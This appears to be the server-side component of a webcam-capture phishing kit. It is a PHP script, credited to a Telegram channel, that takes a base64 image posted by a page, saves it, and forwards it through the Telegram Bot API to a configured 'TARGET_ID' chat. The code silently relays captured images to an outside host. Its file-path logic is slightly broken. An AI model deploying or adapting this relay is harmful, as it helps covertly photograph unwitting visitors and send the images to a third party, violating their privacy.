<?php

/***********************
https://t.me/rmsup
************************/

// load TOKEN and TARGET_ID
$conf = require(__DIR__ . '/config.php');

// exit code if cat parameter not exist
if(!isset($_POST['cat']) || empty($_POST['cat'])) exit();

// get and decode cat param to png binary data
$data = $_POST['cat'];
$data = substr($data, strpos($data, ',') + 1);
$data = base64_decode($data);

// // ask system where is system temp directory
// $file = sys_get_temp_dir();
// // make filename with unique name and 'IMG' prefix in temp directory
// $file = tempnam($file, 'IMG');
// // fill temp file with png data

if(!file_exists('images')) {
    mkdir('images');
}

$file = 'images';
$file .= date('Y-m-d-H-i-s');
$file .= '.png';

file_put_contents($file, $data);
// destroy variable to free memory
unset($data);

// send image with post method
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://api.telegram.org/bot' . $conf->TOKEN . '/sendPhoto',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'chat_id' => $conf->TARGET_ID,
        'photo' => new CURLFile($file)
    ]
]);
curl_exec($ch);
curl_close($ch);